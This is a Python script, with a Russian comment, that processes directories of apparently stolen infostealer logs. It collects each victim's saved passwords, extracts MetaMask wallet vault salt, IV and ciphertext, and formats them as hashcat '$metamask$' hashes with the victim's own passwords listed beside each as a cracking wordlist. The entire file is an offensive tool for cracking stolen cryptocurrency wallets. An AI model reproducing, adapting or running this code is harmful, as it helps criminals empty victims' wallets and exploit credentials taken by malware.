import glob
import re
from audioop import tostereo
from xml.etree.ElementTree import tostring
from builtins import AttributeError

def PASSWORD():
    passwords = set()
    dir_path = r'D:\Logi\podpiska 2\**\Passwords.txt'
    for file in glob.glob(dir_path, recursive=True):
        #print(file)
        word_search = 'Password:'
        with open(file, encoding="utf8") as file:
            for line in file:
                if line.find(word_search):
                    continue
                else:
                    s = line
                    passwords.add(s.replace('Password: ',''))
    f = open('passwords.txt', 'w', encoding="utf8")
    f.writelines(passwords)
    f.close()

def passVault(addressDir):
    passwords = list()
    word_search = 'Password:'
    file = addressDir+'Passwords.txt'
    with open(file, encoding="utf8") as file:
        for line in file:
            if line.find(word_search):
                continue
            else:
                s = line
                #print(s.replace('Password: ',''))
                passwords.append(s.replace('Password: ',''))
    return passwords

def SID(vault):
    result = re.search(r'''salt.*?=''', vault)
    salt = result.group(0).replace('salt":"','')
    result = re.search(r'''iv.*?==''', vault)
    iv = result.group(0).replace('iv":"','')
    result = re.search(r'''data":".*?"''', vault)
    data = result.group(0).replace('data":"','')
    data = data.replace('"','')
    return salt, iv, data

def HashCat(salt, iv, data):
    return '$metamask$'+ salt + '$' + iv + '$' + data

def sysfile(file):
    passwords = list()
    addressFile = str(file)
    result = re.search(r'''[A-Z]{2}.+?\] \[.+?\]''', addressFile)
    name = result.group(0)
    result = re.sub(r'''Wallets.*?log''', '', addressFile)
    addressDir = result
    passwords = passVault(addressDir)
    return addressDir, name, passwords

def getVault(file):
    with open(file, 'r' ,encoding="ANSI") as file:       
        text = file.read()
        result = re.search(r'''{\\"data\\":\\".+?\\"}''', text)
        vault = result.group(0).replace('\\','')
    return vault

def WriteFullVaults(FullVaults):
    f = open('FullVaults.txt', 'w', encoding="utf8")
    f.writelines(FullVaults)
    f.close()
    
def WriteVaults(vaults, iv):
    nameFile = str(iv) + '.txt'
    f = open(nameFile, 'w', encoding="utf8")
    f.writelines(vaults)
    f.close()

def VAULET():
    FullVaults = set()
    dir_path = r'F:\Vlad\workspase\podpiska 2\**\*.log'

    for file in glob.glob(dir_path, recursive=True):
    
        addressDir, name, passwords = sysfile(file)
        try:
            vault = getVault(file)
        except:
            print(AttributeError)
            break
        salt, iv, data = SID(vault)
        hashcat = HashCat(salt, iv, data)
        FullVaults.add(hashcat)
        passwords.sort()
        vaults = list()
        vaults.append(name +'\n\n' + addressDir +'\n\n' + str(file) +'\n\n' + vault +'\n\n' +
                      hashcat +'\n\n' + ' Все пароли с учётом повторения для HASHCAT ' + 
                      '\n\n')
        vaults = [*vaults, *passwords]
        WriteVaults(vaults, iv)        
        #break

    WriteFullVaults(FullVaults)


if __name__ == "__main__":
    PASSWORD()
    print('1/2')
    VAULET()
    print('end')
    


